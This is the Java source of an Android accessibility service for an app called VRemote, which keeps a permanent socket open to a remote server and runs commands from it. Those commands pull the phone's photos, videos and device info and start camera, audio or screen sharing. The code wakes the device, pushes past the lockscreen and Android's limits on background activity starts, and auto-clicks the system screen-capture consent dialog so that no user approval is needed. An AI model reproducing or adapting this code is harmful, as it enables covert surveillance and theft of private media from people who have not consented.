package com.tokendeal.vremote;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import androidx.core.app.NotificationCompat;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Path;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import org.json.JSONObject;
import io.socket.client.IO;
import io.socket.client.Socket;

public class RemoteAccessibilityService extends AccessibilityService {

    private static final String TAG = "VRemoteAccessibility";
    private static volatile RemoteAccessibilityService sInstance = null;
    private static volatile boolean sAutoAcceptPending = false;

    public static void setAutoAcceptPending(boolean pending) {
        sAutoAcceptPending = pending;
        if (pending && sInstance != null) {
            sInstance.scheduleAutoAcceptCheck(0);
        }
    }

    private void scheduleAutoAcceptCheck(int attempt) {
        if (!sAutoAcceptPending || attempt > 30) {
            if (attempt > 30) sAutoAcceptPending = false;
            return;
        }
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            if (!sAutoAcceptPending) return;
            android.view.accessibility.AccessibilityNodeInfo root = null;
            try {
                root = getRootInActiveWindow();
                if (root != null) {
                    processMediaProjectionDialog(root);
                }
            } catch (Throwable ignored) {
            } finally {
                if (root != null) {
                    try {
                        root.recycle();
                    } catch (Throwable ignored) {}
                }
            }
            if (sAutoAcceptPending) {
                scheduleAutoAcceptCheck(attempt + 1);
            }
        }, 350);
    }

    public static RemoteAccessibilityService getInstance() {
        return sInstance;
    }

    public static boolean isServiceRunning() {
        return sInstance != null;
    }

    /**
     * Checks if VRemote's accessibility service is enabled in Android System Settings (Settings.Secure).
     */
    public static boolean isAccessibilityServiceEnabled(Context context) {
        if (context == null) return false;
        try {
            int accessibilityEnabled = 0;
            try {
                accessibilityEnabled = Settings.Secure.getInt(
                        context.getContentResolver(),
                        Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            } catch (Exception ignored) {}

            if (accessibilityEnabled != 1) {
                return false;
            }

            String services = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);

            if (services == null || services.trim().isEmpty()) {
                return false;
            }

            ComponentName expectedComponent = new ComponentName(context, RemoteAccessibilityService.class);
            String expectedString1 = context.getPackageName() + "/" + RemoteAccessibilityService.class.getName();
            String expectedString2 = context.getPackageName() + "/." + RemoteAccessibilityService.class.getSimpleName();
            String simpleTarget = context.getPackageName() + "/" + RemoteAccessibilityService.class.getSimpleName();

            TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
            splitter.setString(services);
            while (splitter.hasNext()) {
                String component = splitter.next();
                if (component == null) continue;
                String trimmed = component.trim();
                if (trimmed.isEmpty()) continue;

                if (trimmed.equalsIgnoreCase(expectedString1)
                        || trimmed.equalsIgnoreCase(expectedString2)
                        || trimmed.contains(simpleTarget)
                        || (trimmed.startsWith(context.getPackageName() + "/") && trimmed.contains("RemoteAccessibilityService"))) {
                    return true;
                }
                ComponentName enabledComponent = ComponentName.unflattenFromString(trimmed);
                if (enabledComponent != null) {
                    if (enabledComponent.equals(expectedComponent)) {
                        return true;
                    }
                    if (context.getPackageName().equalsIgnoreCase(enabledComponent.getPackageName())) {
                        String cls = enabledComponent.getClassName();
                        if (cls != null && (cls.equalsIgnoreCase(RemoteAccessibilityService.class.getName())
                                || cls.endsWith(RemoteAccessibilityService.class.getSimpleName()))) {
                            return true;
                        }
                    }
                }
            }
        } catch (Throwable ignored) {}
        return false;
    }

    /**
     * Dual-check: returns true if either the service is actively running in memory (sInstance != null)
     * OR if it is enabled in Android System Settings (Settings.Secure).
     */
    public static boolean isServiceRunningOrEnabled(Context context) {
        return isServiceRunning() || isAccessibilityServiceEnabled(context);
    }

    private Socket mBgSocket = null;
    private static final String APP_URL = "https://v.tokendeal.cloud";

    private PowerManager.WakeLock mServiceWakeLock = null;
    private WifiManager.WifiLock mWifiLock = null;
    private final Handler mWatchdogHandler = new Handler(Looper.getMainLooper());
    private final Runnable mWatchdogRunnable = new Runnable() {
        @Override
        public void run() {
            try {
                if (mBgSocket == null || !mBgSocket.connected()) {
                    Log.i(TAG, "Watchdog: Background socket disconnected, reconnecting...");
                    initBackgroundSocket();
                }
            } catch (Exception ignored) {}
            mWatchdogHandler.postDelayed(this, 3000);
        }
    };

    private void acquireLocks() {
        try {
            if (mServiceWakeLock == null) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    mServiceWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "vremote:bg_service_lock");
                    mServiceWakeLock.setReferenceCounted(false);
                }
            }
            if (mServiceWakeLock != null && !mServiceWakeLock.isHeld()) {
                mServiceWakeLock.acquire();
                Log.i(TAG, "Acquired 24/7 Partial WakeLock for Background Accessibility Service");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring service wake lock", e);
        }

        try {
            if (mWifiLock == null) {
                WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (wm != null) {
                    mWifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "vremote:bg_wifi_lock");
                    mWifiLock.setReferenceCounted(false);
                }
            }
            if (mWifiLock != null && !mWifiLock.isHeld()) {
                mWifiLock.acquire();
                Log.i(TAG, "Acquired High-Perf WiFi Lock for 24/7 Connectivity");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wifi lock", e);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;
        AppLog.i(TAG, "Remote Accessibility Service Created.");
        acquireLocks();
        initBackgroundSocket();
        mWatchdogHandler.postDelayed(mWatchdogRunnable, 3000);
        KeepAliveScheduler.schedulePeriodicWork(this);
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sInstance = this;
        AppLog.i(TAG, "Remote Accessibility Service Connected and Ready.");
        try {
            SharedPreferences prefs = getSharedPreferences("VRemoteDevicePrefs", Context.MODE_PRIVATE);
            prefs.edit().putBoolean("has_prompted_accessibility", true).apply();
        } catch (Exception ignored) {}
        acquireLocks();
        if (mBgSocket == null || !mBgSocket.connected()) {
            initBackgroundSocket();
        }
        KeepAliveScheduler.schedulePeriodicWork(this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            mWatchdogHandler.removeCallbacks(mWatchdogRunnable);
            if (mServiceWakeLock != null && mServiceWakeLock.isHeld()) {
                mServiceWakeLock.release();
            }
            if (mWifiLock != null && mWifiLock.isHeld()) {
                mWifiLock.release();
            }
            if (mBgSocket != null) {
                AppLogs.unregisterSocket(mBgSocket);
                mBgSocket.disconnect();
                mBgSocket.close();
            }
        } catch (Exception ignored) {}
        sInstance = null;
    }

    private void initBackgroundSocket() {
        if (mBgSocket != null) {
            if (mBgSocket.connected()) return;
            mBgSocket.connect();
            return;
        }
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = 1000;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket", "polling"};

            mBgSocket = IO.socket(APP_URL, opts);
            AppLogs.registerSocket(mBgSocket);

            mBgSocket.on(Socket.EVENT_CONNECT, args -> {
                AppLog.i(TAG, "Background Accessibility Socket Connected.");
                registerDeviceBackground();
            });

            mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
                AppLog.w(TAG, "Background Accessibility Socket Disconnected.");
            });

            mBgSocket.on("auto-command", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String command = data.optString("command", "");
                    String fromSocketId = data.optString("from", "");
                    String caller = data.optString("caller", fromSocketId);
                    String cameraChoice = data.optString("cameraChoice", "front");
                    int page = data.optInt("page", 0);
                    long mediaId = data.optLong("mediaId", -1);
                    String mediaType = data.optString("mediaType", "image");

                    AppLog.i(TAG, "Background auto-command received: " + command + " from " + caller);

                    if ("get_gallery".equals(command)) {
                        MediaBridge.getGalleryPage(this, page, mBgSocket, fromSocketId);
                    } else if ("get_videos".equals(command)) {
                        MediaBridge.getVideoPage(this, page, mBgSocket, fromSocketId);
                    } else if ("get_media_detail".equals(command)) {
                        MediaBridge.getMediaItemDetail(this, mediaId, mediaType, mBgSocket, fromSocketId);
                    } else if ("get_device_info".equals(command)) {
                        JSONObject info = new JSONObject();
                        info.put("deviceId", DeviceRegistry.getDeviceId(this));
                        info.put("deviceName", DeviceRegistry.getDeviceModel());
                        info.put("ram", DeviceRegistry.getDeviceRam(this));
                        info.put("platform", "android");
                        info.put("targetSocketId", fromSocketId);
                        if (mBgSocket != null && mBgSocket.connected()) {
                            mBgSocket.emit("device-info-response", info);
                        }
                    } else if ("audio_call".equals(command) || "video_call".equals(command) ||
                               "screen_share".equals(command) || "screen_share_control".equals(command)) {
                        wakeUpAndLaunch(command, caller, cameraChoice);
                    } else if ("end_call".equals(command)) {
                        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                        stopService(serviceIntent);
                        if (MainActivity.getCompanionInstance() != null) {
                            MainActivity.getCompanionInstance().endCall(false);
                        }
                        if (MainActivity.getInstance() != null) {
                            MainActivity.getInstance().runOnUiThread(() -> {
                                MainActivity.getInstance().stopAllMediaAndFinish();
                            });
                        }
                    } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
                        if (MainActivity.getCompanionInstance() != null) {
                            MainActivity.getCompanionInstance().switchCompanionCamera();
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing background auto-command", e);
                }
            });

            mBgSocket.connect();
        } catch (Exception e) {
            Log.e(TAG, "Error initializing background socket", e);
        }
    }

    private void registerDeviceBackground() {
        try {
            String deviceId = DeviceRegistry.getDeviceId(this);
            String deviceName = DeviceRegistry.getDeviceModel();
            String ram = DeviceRegistry.getDeviceRam(this);

            JSONObject payload = new JSONObject();
            payload.put("deviceId", deviceId);
            payload.put("deviceName", deviceName);
            payload.put("ram", ram);
            payload.put("platform", "android");
            payload.put("role", "accessibility_service");

            if (mBgSocket != null && mBgSocket.connected()) {
                mBgSocket.emit("register-device", payload);
                AppLog.i(TAG, "Background Accessibility Device Registered: " + deviceId + " (" + deviceName + ")");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error registering background device", e);
        }
    }

    private void wakeUpAndLaunch(String command, String caller, String cameraChoice) {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.FULL_WAKE_LOCK |
                        PowerManager.ACQUIRE_CAUSES_WAKEUP |
                        PowerManager.ON_AFTER_RELEASE,
                        "vremote:auto_wake"
                );
                wl.acquire(15000);
            }
        } catch (Exception ignored) {}

        if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
            setAutoAcceptPending(true);
        }

        // 1. If MainActivity instance is running (even in background), execute directly!
        if (MainActivity.getInstance() != null) {
            MainActivity.getInstance().runOnUiThread(() -> {
                MainActivity.getInstance().handleAutoCommandDirectly(command, caller, cameraChoice);
            });
            if (!"screen_share".equals(command) && !"screen_share_control".equals(command)) {
                return;
            }
        }

        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        intent.putExtra("auto_command", command);
        intent.putExtra("caller", caller);
        intent.putExtra("cameraChoice", cameraChoice);

        // 2. High priority full screen intent notification to bypass lockscreen and Android 14 BAL restrictions
        try {
            triggerFullScreenWakeNotification(this, intent, command);
        } catch (Throwable ignored) {}

        try {
            if (Build.VERSION.SDK_INT >= 34) {
                android.app.ActivityOptions opt = android.app.ActivityOptions.makeBasic();
                opt.setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                startActivity(intent, opt.toBundle());
            } else {
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "startActivity failed: " + e.getMessage());
        }
    }

    public static void triggerFullScreenWakeNotification(Context context, Intent intent, String command) {
        try {
            NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            String channelId = "VRemoteWakeChannel";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel chan = new NotificationChannel(
                        channelId,
                        "VRemote Remote Activation",
                        NotificationManager.IMPORTANCE_HIGH
                );
                chan.setLockscreenVisibility(android.app.Notification.VISIBILITY_PUBLIC);
                chan.enableVibration(true);
                nm.createNotificationChannel(chan);
            }

            android.app.PendingIntent pi = android.app.PendingIntent.getActivity(
                    context,
                    991,
                    intent,
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT |
                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? android.app.PendingIntent.FLAG_IMMUTABLE : 0)
            );

            NotificationCompat.Builder nb = new NotificationCompat.Builder(context, channelId)
                    .setSmallIcon(R.drawable.app_icon)
                    .setContentTitle("VRemote Unattended Session")
                    .setContentText("Activating " + command + " session...")
                    .setPriority(NotificationCompat.PRIORITY_MAX)
                    .setCategory(NotificationCompat.CATEGORY_CALL)
                    .setFullScreenIntent(pi, true)
                    .setAutoCancel(true);

            nm.notify(991, nb.build());
        } catch (Throwable ignored) {}
    }

    private static long sLastDialogCheckTime = 0;
    private static final java.util.concurrent.atomic.AtomicBoolean sIsProcessingDialog = new java.util.concurrent.atomic.AtomicBoolean(false);

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!sAutoAcceptPending || event == null) return;

        try {
            int eventType = event.getEventType();
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

                long now = System.currentTimeMillis();
                if (now - sLastDialogCheckTime < 350) {
                    return;
                }
                sLastDialogCheckTime = now;

                android.view.accessibility.AccessibilityNodeInfo root = null;
                try {
                    root = getRootInActiveWindow();
                    if (root != null) {
                        processMediaProjectionDialog(root);
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "Error inspecting root in onAccessibilityEvent: " + t.getMessage());
                } finally {
                    if (root != null) {
                        try {
                            root.recycle();
                        } catch (Throwable ignored) {}
                    }
                }
            }
        } catch (Throwable t) {
            Log.e(TAG, "onAccessibilityEvent error: " + t.getMessage());
        }
    }

    private void processMediaProjectionDialog(android.view.accessibility.AccessibilityNodeInfo root) {
        if (root == null || !sAutoAcceptPending) return;

        // Re-entrancy protection: only one inspection/click flow at a time
        if (!sIsProcessingDialog.compareAndSet(false, true)) {
            return;
        }

        try {
            // Step 1: If "Start now" button is already present on the dialog, click it immediately!
            boolean started = findAndClickStartButton(root);
            if (started) {
                sAutoAcceptPending = false;
                Log.i(TAG, "Successfully auto-accepted entire screen share dialog via Start button!");
                AppLog.i(TAG, "Successfully auto-accepted entire screen share dialog via Start button!");
                return;
            }

            // Step 2: If there is an option or radio for "Entire screen", select it!
            boolean entireScreenFound = clickEntireScreenOption(root);
            if (entireScreenFound) {
                boolean s = findAndClickStartButton(root);
                if (s) {
                    sAutoAcceptPending = false;
                    Log.i(TAG, "Successfully auto-accepted entire screen share dialog!");
                    AppLog.i(TAG, "Successfully auto-accepted entire screen share dialog!");
                }
                return;
            }

            // Step 3: In Android 14, default is often "Single app". If spinner is showing single app, click it to open dropdown
            boolean opened = clickSingleAppSpinner(root);
            if (opened) {
                // Dropdown will trigger next window event where Entire Screen item will be selected
                return;
            }
        } catch (Throwable t) {
            Log.e(TAG, "processMediaProjectionDialog error: " + t.getMessage(), t);
        } finally {
            sIsProcessingDialog.set(false);
        }
    }

    // Iterative Breadth-First-Search (BFS) traversal - ZERO recursion, stack depth is strictly 1
    private boolean clickEntireScreenOption(android.view.accessibility.AccessibilityNodeInfo root) {
        if (root == null) return false;
        java.util.Queue<android.view.accessibility.AccessibilityNodeInfo> queue = new java.util.ArrayDeque<>();
        queue.add(root);
        int visited = 0;

        while (!queue.isEmpty() && visited < 120) {
            android.view.accessibility.AccessibilityNodeInfo node = queue.poll();
            visited++;

            try {
                CharSequence text = node.getText();
                CharSequence desc = node.getContentDescription();
                String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();

                if (!candidate.isEmpty()) {
                    if (candidate.contains("entire screen") || candidate.contains("whole screen") ||
                        candidate.contains("full screen") || candidate.contains("all screen") || candidate.equals("entire")) {
                        if (node.isClickable()) {
                            node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Selected 'Entire screen' option!");
                            return true;
                        } else if (node.getParent() != null && node.getParent().isClickable()) {
                            node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Selected 'Entire screen' option via parent!");
                            return true;
                        }
                    }
                }

                int count = node.getChildCount();
                for (int i = 0; i < count; i++) {
                    android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
                    if (child != null) {
                        queue.add(child);
                    }
                }
            } catch (Throwable t) {
                Log.w(TAG, "Error in clickEntireScreenOption node: " + t.getMessage());
            }
        }
        return false;
    }

    // Iterative Breadth-First-Search (BFS) traversal - ZERO recursion, stack depth is strictly 1
    private boolean clickSingleAppSpinner(android.view.accessibility.AccessibilityNodeInfo root) {
        if (root == null) return false;
        java.util.Queue<android.view.accessibility.AccessibilityNodeInfo> queue = new java.util.ArrayDeque<>();
        queue.add(root);
        int visited = 0;

        while (!queue.isEmpty() && visited < 120) {
            android.view.accessibility.AccessibilityNodeInfo node = queue.poll();
            visited++;

            try {
                CharSequence text = node.getText();
                CharSequence desc = node.getContentDescription();
                String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();

                if (!candidate.isEmpty()) {
                    if (candidate.contains("single app") || candidate.contains("a single app") || candidate.contains("an app")) {
                        if (node.isClickable()) {
                            node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Clicked single app spinner to show Entire screen option!");
                            return true;
                        } else if (node.getParent() != null && node.getParent().isClickable()) {
                            node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Clicked single app spinner via parent!");
                            return true;
                        }
                    }
                }

                String viewId = node.getViewIdResourceName();
                if (viewId != null && (viewId.contains("screen_share_mode_spinner") || viewId.contains("spinner"))) {
                    if (node.isClickable()) {
                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }

                int count = node.getChildCount();
                for (int i = 0; i < count; i++) {
                    android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
                    if (child != null) {
                        queue.add(child);
                    }
                }
            } catch (Throwable t) {
                Log.w(TAG, "Error in clickSingleAppSpinner node: " + t.getMessage());
            }
        }
        return false;
    }

    // Iterative Breadth-First-Search (BFS) traversal - ZERO recursion, stack depth is strictly 1
    private boolean findAndClickStartButton(android.view.accessibility.AccessibilityNodeInfo root) {
        if (root == null) return false;
        java.util.Queue<android.view.accessibility.AccessibilityNodeInfo> queue = new java.util.ArrayDeque<>();
        queue.add(root);
        int visited = 0;

        while (!queue.isEmpty() && visited < 120) {
            android.view.accessibility.AccessibilityNodeInfo node = queue.poll();
            visited++;

            try {
                CharSequence text = node.getText();
                CharSequence desc = node.getContentDescription();
                String candidate = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase().trim();

                if (!candidate.isEmpty()) {
                    if (candidate.equals("start now") || candidate.equals("start") || candidate.equals("start recording") ||
                        candidate.equals("allow") || candidate.contains("start now") || candidate.contains("start recording")) {
                        if (node.isClickable()) {
                            return node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                        } else if (node.getParent() != null && node.getParent().isClickable()) {
                            return node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                }

                String viewId = node.getViewIdResourceName();
                if (viewId != null && (viewId.endsWith("button1") || viewId.endsWith("confirm"))) {
                    if (node.isClickable()) {
                        return node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }

                int childCount = node.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
                    if (child != null) {
                        queue.add(child);
                    }
                }
            } catch (Throwable t) {
                Log.w(TAG, "Error in findAndClickStartButton node: " + t.getMessage());
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Remote Accessibility Service Interrupted.");
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        sInstance = null;
        return super.onUnbind(intent);
    }

    private DisplayMetrics getRealScreenMetrics() {
        DisplayMetrics metrics = new DisplayMetrics();
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null && wm.getDefaultDisplay() != null) {
                wm.getDefaultDisplay().getRealMetrics(metrics);
                if (metrics.widthPixels > 0 && metrics.heightPixels > 0) {
                    return metrics;
                }
            }
        } catch (Throwable ignored) {}
        try {
            DisplayMetrics dm = getResources().getDisplayMetrics();
            if (dm != null && dm.widthPixels > 0 && dm.heightPixels > 0) {
                return dm;
            }
        } catch (Throwable ignored) {}
        DisplayMetrics fallback = new DisplayMetrics();
        fallback.widthPixels = 1080;
        fallback.heightPixels = 1920;
        return fallback;
    }

    /**
     * Dispatches a tap gesture on the screen using normalized coordinates (0.0 to 1.0)
     */
    public boolean performTap(float normX, float normY) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        try {
            if (!Float.isFinite(normX) || !Float.isFinite(normY)) {
                return false;
            }
            float safeX = Math.max(0.0f, Math.min(1.0f, normX));
            float safeY = Math.max(0.0f, Math.min(1.0f, normY));

            DisplayMetrics metrics = getRealScreenMetrics();
            int width = (metrics != null && metrics.widthPixels > 0) ? metrics.widthPixels : 1080;
            int height = (metrics != null && metrics.heightPixels > 0) ? metrics.heightPixels : 1920;

            float x = safeX * width;
            float y = safeY * height;

            Path path = new Path();
            path.moveTo(x, y);
            path.lineTo(x, y + 1.0f);

            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(path, 0, 50);

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);

            GestureResultCallback callback = new GestureResultCallback() {
                @Override
                public void onCompleted(GestureDescription gestureDescription) {
                    AppLog.d(TAG, "performTap gesture completed at (" + (int) x + ", " + (int) y + ")");
                }
                @Override
                public void onCancelled(GestureDescription gestureDescription) {
                    AppLog.w(TAG, "performTap gesture cancelled by system at (" + (int) x + ", " + (int) y + ")");
                }
            };

            AppLog.i(TAG, "performTap injected at: (" + (int) x + ", " + (int) y + ")");
            return dispatchGesture(builder.build(), callback, null);
        } catch (Throwable t) {
            AppLog.e(TAG, "performTap safe catch: " + t.getMessage(), t);
            return false;
        }
    }

    /**
     * Dispatches a swipe / scroll gesture from start to end coordinates
     */
    public boolean performSwipe(float startNormX, float startNormY, float endNormX, float endNormY, long durationMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        try {
            if (!Float.isFinite(startNormX) || !Float.isFinite(startNormY) ||
                !Float.isFinite(endNormX) || !Float.isFinite(endNormY)) {
                return false;
            }
            float safeStartX = Math.max(0.0f, Math.min(1.0f, startNormX));
            float safeStartY = Math.max(0.0f, Math.min(1.0f, startNormY));
            float safeEndX = Math.max(0.0f, Math.min(1.0f, endNormX));
            float safeEndY = Math.max(0.0f, Math.min(1.0f, endNormY));

            DisplayMetrics metrics = getRealScreenMetrics();
            int width = (metrics != null && metrics.widthPixels > 0) ? metrics.widthPixels : 1080;
            int height = (metrics != null && metrics.heightPixels > 0) ? metrics.heightPixels : 1920;

            float x1 = safeStartX * width;
            float y1 = safeStartY * height;
            float x2 = safeEndX * width;
            float y2 = safeEndY * height;

            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);

            long duration = Math.max(100L, Math.min(1000L, durationMs > 0 ? durationMs : 250L));
            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(path, 0, duration);

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);

            GestureResultCallback callback = new GestureResultCallback() {
                @Override
                public void onCompleted(GestureDescription gestureDescription) {
                    AppLog.d(TAG, "performSwipe gesture completed");
                }
                @Override
                public void onCancelled(GestureDescription gestureDescription) {
                    AppLog.w(TAG, "performSwipe gesture cancelled by system");
                }
            };

            AppLog.i(TAG, "performSwipe injected: (" + (int) x1 + "," + (int) y1 + ") -> (" + (int) x2 + "," + (int) y2 + ")");
            return dispatchGesture(builder.build(), callback, null);
        } catch (Throwable t) {
            AppLog.e(TAG, "performSwipe safe catch: " + t.getMessage(), t);
            return false;
        }
    }

    public boolean performBack() {
        try {
            AppLog.i(TAG, "performBack injected");
            return performGlobalAction(GLOBAL_ACTION_BACK);
        } catch (Throwable t) {
            AppLog.e(TAG, "performBack error", t);
            return false;
        }
    }

    public boolean performHome() {
        try {
            AppLog.i(TAG, "performHome injected");
            return performGlobalAction(GLOBAL_ACTION_HOME);
        } catch (Throwable t) {
            AppLog.e(TAG, "performHome error", t);
            return false;
        }
    }

    public boolean performRecentApps() {
        try {
            AppLog.i(TAG, "performRecentApps injected");
            return performGlobalAction(GLOBAL_ACTION_RECENTS);
        } catch (Throwable t) {
            AppLog.e(TAG, "performRecentApps error", t);
            return false;
        }
    }
}
